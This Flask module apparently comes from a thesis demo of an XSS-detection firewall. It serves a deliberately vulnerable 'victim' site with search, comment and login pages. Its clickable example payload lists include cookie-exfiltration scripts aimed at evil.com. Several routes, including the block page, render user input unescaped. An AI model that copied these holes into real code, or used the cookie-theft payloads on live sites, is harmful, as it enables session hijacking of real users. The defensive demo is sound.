"""
Victim Website — XSS Demo Target
==================================
Simulates a real vulnerable website (Search, Comments, Login).
Every input is monitored by the GNN-DQN-MAFS XSS Firewall.

Routes:
    /victim/          → Home
    /victim/search    → Search page
    /victim/comments  → Comments page
    /victim/login     → Login page
"""

import html as _html
from flask import Blueprint, request
from firewall_service import detect_xss
from datetime import datetime

victim_bp = Blueprint('victim', __name__, url_prefix='/victim')

# In-memory comments store
comments_store = []


def _log_to_dashboard(text, det):
    """Forward a victim-site detection into the main dashboard history."""
    try:
        from app import detection_history, session_stats
        entry = {
            'input_preview': (text[:80] + '...') if len(text) > 80 else text,
            'is_xss':        det['is_xss'],
            'score':         det['score'],
            'risk_level':    det['risk_level'],
            'method':        det['method'] + ' (victim)',
            'patterns':      det.get('patterns', []),
            'pattern_score': det.get('pattern_score', 0),
            'ml_score':      det.get('ml_score'),
            'elapsed_ms':    0,
            'timestamp':     datetime.now().isoformat(),
        }
        detection_history.insert(0, entry)
        if len(detection_history) > 100:
            detection_history.pop()
        session_stats['total_checks'] += 1
        if det['is_xss']:
            session_stats['blocked'] += 1
        else:
            session_stats['safe'] += 1
    except Exception:
        # Never let dashboard logging break victim-site rendering
        pass

# ══════════════════════════════════════════════════════════════════
# Shared HTML pieces
# ══════════════════════════════════════════════════════════════════

STYLE = """
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
body{background:#f0f2f5;min-height:100vh}
nav{background:#2c3e50;padding:12px 30px;display:flex;align-items:center;justify-content:space-between}
.logo{color:white;font-weight:bold;font-size:18px}
.logo span{color:#e74c3c}
nav ul{list-style:none;display:flex;gap:20px}
nav ul a{color:#bdc3c7;text-decoration:none;font-size:14px}
nav ul a:hover{color:white}
.banner{background:#e67e22;color:white;text-align:center;padding:8px;font-size:13px;font-weight:bold}
.container{max-width:900px;margin:30px auto;padding:0 20px}
.card{background:white;border-radius:10px;padding:30px;box-shadow:0 2px 10px rgba(0,0,0,.08);margin-bottom:20px}
.card h2{color:#2c3e50;margin-bottom:20px;font-size:20px}
input[type=text],input[type=password],textarea{width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:6px;font-size:14px;margin-bottom:12px;outline:none;transition:border .2s}
input:focus,textarea:focus{border-color:#3498db}
textarea{height:100px;resize:vertical}
button[type=submit]{background:#2c3e50;color:white;border:none;padding:12px 28px;border-radius:6px;font-size:14px;cursor:pointer}
button[type=submit]:hover{background:#34495e}
.blocked{background:#c0392b;color:white;border-radius:10px;padding:25px;text-align:center;margin-top:18px;animation:pulse 1s infinite alternate}
.blocked h2{font-size:26px;margin-bottom:8px}
.blocked .det{background:rgba(0,0,0,.2);border-radius:6px;padding:14px;margin-top:12px;text-align:left;font-size:13px;line-height:1.8}
.safe{background:#27ae60;color:white;border-radius:8px;padding:14px;margin-top:12px}
.result{border-left:3px solid #3498db;padding:10px 15px;margin-bottom:10px;background:#f8f9fa;border-radius:0 6px 6px 0;color:#555}
.comment{border-bottom:1px solid #f0f0f0;padding:14px 0}
.comment .who{font-weight:bold;color:#2c3e50;font-size:13px}
.comment .when{color:#95a5a6;font-size:11px;margin-left:8px}
.comment .body{margin-top:5px;color:#555;font-size:14px}
.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:15px;margin-top:20px}
.tile{border-radius:8px;padding:22px;text-align:center;text-decoration:none;display:block}
.tile .icon{font-size:28px}
.tile .lbl{margin-top:8px;font-weight:bold;color:white}
.tile .sub{font-size:12px;opacity:.8;margin-top:4px;color:white}
.payloads{font-family:monospace;font-size:13px;color:#c0392b;line-height:2.2;background:#fff5f5;padding:15px;border-radius:6px;margin-top:10px}
.payload-hint{margin-top:14px;padding:14px;background:#fff8f3;border:1px dashed #f39c12;border-radius:8px}
.payload-hint .head{font-size:13px;color:#7f4f00;margin-bottom:8px;font-weight:bold}
.payload-item{cursor:pointer;padding:6px 12px;margin:4px 0;border-radius:5px;background:white;border:1px solid #f0c0c0;display:flex;align-items:center;gap:8px;transition:all .15s ease}
.payload-item:hover{background:#ffe5e5;border-color:#e74c3c;transform:translateX(3px)}
.payload-item code{font-size:12px;color:#c0392b;white-space:pre-wrap;word-break:break-all;flex:1}
.payload-item .tag{font-size:10px;text-transform:uppercase;background:#e74c3c;color:white;padding:2px 6px;border-radius:3px;letter-spacing:.5px}
@keyframes pulse{from{box-shadow:0 0 10px rgba(231,76,60,.4)}to{box-shadow:0 0 28px rgba(231,76,60,.9)}}
</style>"""

def nav():
    return """
<nav>
  <div class="logo">Test<span>Portal</span></div>
  <ul>
    <li><a href="/victim/">Home</a></li>
    <li><a href="/victim/search">Search</a></li>
    <li><a href="/victim/comments">Comments</a></li>
    <li><a href="/victim/login">Login</a></li>
    <li><a href="/">🛡 Firewall</a></li>
  </ul>
</nav>
<div class="banner">⚠️ DEMO TARGET SITE — Protected by GNN-DQN-MAFS XSS Firewall</div>"""


THESIS_FOOTER = """
<footer style="text-align:center;padding:18px;background:#2c3e50;color:#bdc3c7;font-size:12px;margin-top:30px">
  <div style="margin-bottom:5px;color:white;font-weight:bold">
    Cybersecurity framework for Detection and Prevention of Cross-Site Scripting Attacks Using Hybrid Deep Learning Techniques
  </div>
  <div>Student: <strong style="color:white">Ali Nafea Yousif</strong>
  &nbsp;|&nbsp;
  Supervised By: <strong style="color:white">Prof. Dr. Ziyad Tariq Mustafa Al-Ta'i</strong></div>
</footer>"""

_FILL_FIELD_JS = """
<script>
function fillField(id, el) {
  const input = document.getElementById(id);
  if (!input) return;
  input.value = el.dataset.payload;
  input.focus();
  // Brief flash so the user sees the input was populated
  input.style.background = '#fff5cc';
  setTimeout(() => { input.style.background = ''; }, 600);
}
</script>"""


PAYLOADS_REFLECTED = [
    ("Basic script tag",       "<script>alert('Reflected XSS')</script>"),
    ("IMG onerror",            "<img src=x onerror=alert('Reflected')>"),
    ("SVG onload",             "<svg onload=alert(1)>"),
    ("JavaScript URI",         "<a href=\"javascript:alert(1)\">click</a>"),
    ("URL-encoded payload",    "%3Cscript%3Ealert(1)%3C/script%3E"),
    ("Attribute breakout",     "\"><script>alert(1)</script>"),
]

PAYLOADS_STORED = [
    ("Persistent script",      "<script>alert('Stored XSS persists for every visitor!')</script>"),
    ("Cookie exfiltration",    "<script>fetch('https://evil.com/?c='+document.cookie)</script>"),
    ("IMG payload (no <script>)", "<img src=x onerror=alert('Stored attack')>"),
    ("Iframe javascript: URI", "<iframe src=\"javascript:alert(1)\"></iframe>"),
    ("Autofocus event handler","<input onfocus=alert('stored') autofocus>"),
    ("SVG with onload",        "<svg/onload=alert('stored payload')>"),
]

PAYLOADS_LOGIN = [
    ("Script in username",     "<script>alert('Login XSS')</script>"),
    ("Cookie steal",           "<script>alert(document.cookie)</script>"),
    ("IMG onerror in field",   "<img src=x onerror=alert('login')>"),
    ("Attribute-break attempt","admin\"><script>alert(1)</script>"),
    ("Event handler injection","\" onmouseover=alert(1) x=\""),
    ("SQL+XSS combo",          "admin'-- <script>alert(1)</script>"),
]


def render_payload_panel(payloads, target_id, context_label):
    """Build a clickable example-payloads panel for a given input id and context label."""
    items_html = ''.join(
        f'<div class="payload-item" data-payload="{_html.escape(payload, quote=True)}" '
        f'onclick="fillField(\'{target_id}\', this)" title="Click to fill the input">'
        f'  <span class="tag">{_html.escape(label)}</span>'
        f'  <code>{_html.escape(payload)}</code>'
        f'</div>'
        for label, payload in payloads
    )
    return f"""
<div class="payload-hint">
  <div class="head">💡 Example {context_label} payloads &middot; click any to fill the field</div>
  {items_html}
</div>"""


def page(title, body):
    return f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>{title} — TestPortal</title>{STYLE}</head>
<body>{nav()}<div class="container">{body}</div>{THESIS_FOOTER}{_FILL_FIELD_JS}</body></html>"""


def blocked_html(detection, input_text):
    patterns = ', '.join(p['name'] for p in detection['patterns']) if detection['patterns'] else 'DL model'
    return f"""
<div class="blocked">
  <h2>🚨 XSS ATTACK BLOCKED!</h2>
  <p>The GNN-DQN-MAFS Firewall intercepted a malicious payload.</p>
  <div class="det">
    <b>Input:</b> {input_text[:120]}<br>
    <b>Risk Level:</b> {detection['risk_level'].upper()}<br>
    <b>Threat Score:</b> {detection['score']:.3f}<br>
    <b>Detection Method:</b> {detection['method']}<br>
    <b>Matched Patterns:</b> {patterns}
  </div>
</div>"""


# ══════════════════════════════════════════════════════════════════
# Routes
# ══════════════════════════════════════════════════════════════════

@victim_bp.route('/')
def home():
    body = """
<div class="card">
  <h2>🏠 Welcome to TestPortal</h2>
  <p style="color:#555;line-height:1.7">
    This simulated website is the <b>attack target</b> in our XSS detection demo.<br>
    Submit XSS payloads in any page — the firewall will intercept them in real time!
  </p>
  <div class="grid">
    <a class="tile" href="/victim/search" style="background:#3498db">
      <div class="icon">🔍</div><div class="lbl">Search</div><div class="sub">Reflected XSS</div>
    </a>
    <a class="tile" href="/victim/comments" style="background:#27ae60">
      <div class="icon">💬</div><div class="lbl">Comments</div><div class="sub">Stored XSS</div>
    </a>
    <a class="tile" href="/victim/login" style="background:#8e44ad">
      <div class="icon">🔐</div><div class="lbl">Login</div><div class="sub">Credential XSS</div>
    </a>
  </div>
</div>

<div class="card" style="border-left:4px solid #e74c3c">
  <h2>🎯 XSS Payloads to Try</h2>
  <div class="payloads">
    &lt;script&gt;alert('XSS')&lt;/script&gt;<br>
    &lt;img src=x onerror=alert(1)&gt;<br>
    &lt;svg onload=alert('XSS')&gt;<br>
    &lt;script&gt;document.location='http://evil.com/?c='+document.cookie&lt;/script&gt;<br>
    eval(atob('YWxlcnQoMSk='))
  </div>
</div>"""
    return page('Home', body)


@victim_bp.route('/search', methods=['GET', 'POST'])
def search():
    query = ''
    result_html = ''

    if request.method == 'POST':
        query = request.form.get('query', '').strip()
        if query:
            det = detect_xss(query)
            _log_to_dashboard(query, det)
            if det['is_xss']:
                result_html = blocked_html(det, query)
            else:
                results = [
                    f"Article: <b>{query}</b> — A complete guide (2024)",
                    f"Tutorial: Getting started with <b>{query}</b> — 12 min read",
                    f"News: Latest updates on <b>{query}</b> — Today",
                ]
                result_html = (
                    '<div class="safe">✅ Safe input — showing results:</div>'
                    + ''.join(f'<div class="result" style="margin-top:10px">{r}</div>' for r in results)
                )

    payloads_panel = render_payload_panel(PAYLOADS_REFLECTED, 'queryInput', 'reflected-context')

    body = f"""
<div class="card">
  <h2>🔍 Search Articles <span style="font-size:12px;font-weight:normal;color:#888">— reflected-context demo</span></h2>
  <form method="POST">
    <input type="text" name="query" id="queryInput"
           placeholder="Search... or click an example payload below"
           value="{_html.escape(query, quote=True)}" autofocus>
    <button type="submit">Search</button>
  </form>
  {payloads_panel}
  {result_html}
</div>"""
    return page('Search', body)


@victim_bp.route('/comments', methods=['GET', 'POST'])
def comments():
    alert_html = ''

    if request.method == 'POST':
        name = request.form.get('name', 'Anonymous').strip() or 'Anonymous'
        text = request.form.get('comment', '').strip()

        name_det = detect_xss(name)
        text_det = detect_xss(text)
        _log_to_dashboard(name, name_det)
        if text:
            _log_to_dashboard(text, text_det)

        if name_det['is_xss'] or text_det['is_xss']:
            bad   = name_det if name_det['is_xss'] else text_det
            field = 'Name' if name_det['is_xss'] else 'Comment'
            bad_input = name if name_det['is_xss'] else text
            alert_html = (
                f'<div style="background:#e74c3c;color:white;padding:8px 14px;border-radius:6px;margin-bottom:6px">'
                f'⛔ Stored XSS blocked in <b>{field}</b> field — comment rejected.</div>'
                + blocked_html(bad, bad_input)
            )
        else:
            comments_store.insert(0, {
                'name': name,
                'text': text,
                'time': datetime.now().strftime('%H:%M:%S')
            })
            alert_html = '<div class="safe">✅ Comment posted safely!</div>'

    items = ''.join(f"""
<div class="comment">
  <span class="who">{c['name']}</span>
  <span class="when">{c['time']}</span>
  <div class="body">{c['text']}</div>
</div>""" for c in comments_store) or '<p style="color:#aaa;padding:10px 0">No comments yet — be the first!</p>'

    payloads_panel = render_payload_panel(PAYLOADS_STORED, 'commentInput', 'stored-context')

    body = f"""
<div class="card">
  <h2>💬 Post a Comment <span style="font-size:12px;font-weight:normal;color:#888">— stored-context demo</span></h2>
  <form method="POST">
    <input type="text" name="name" id="nameInput"
           placeholder="Your name">
    <textarea name="comment" id="commentInput"
              placeholder="Your comment — or click an example payload below"></textarea>
    <button type="submit">Post Comment</button>
  </form>
  {payloads_panel}
  {alert_html}
</div>
<div class="card">
  <h2>📝 Comments ({len(comments_store)})</h2>
  {items}
</div>"""
    return page('Comments', body)


@victim_bp.route('/login', methods=['GET', 'POST'])
def login():
    alert_html = ''

    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()

        u_det = detect_xss(username)
        p_det = detect_xss(password)
        if username:
            _log_to_dashboard(username, u_det)
        if password:
            _log_to_dashboard(password, p_det)

        if u_det['is_xss'] or p_det['is_xss']:
            bad   = u_det if u_det['is_xss'] else p_det
            field = 'Username' if u_det['is_xss'] else 'Password'
            bad_input = username if u_det['is_xss'] else password
            alert_html = blocked_html(bad, bad_input)
        elif username:
            alert_html = f'<div class="safe">✅ Safe login attempt — Welcome, <b>{username}</b>!</div>'

    payloads_panel = render_payload_panel(PAYLOADS_LOGIN, 'usernameInput', 'auth-form-context')

    body = f"""
<div class="card" style="max-width:560px;margin:0 auto">
  <h2>🔐 Login <span style="font-size:12px;font-weight:normal;color:#888">— auth-form-context demo</span></h2>
  <p style="color:#777;margin-bottom:20px;font-size:13px">
    Click an example payload below to fill the username field, then press Login.
  </p>
  <form method="POST">
    <input type="text"     name="username" id="usernameInput" placeholder="Username">
    <input type="password" name="password" id="passwordInput" placeholder="Password">
    <button type="submit" style="width:100%">Login</button>
  </form>
  {payloads_panel}
  {alert_html}
</div>"""
    return page('Login', body)
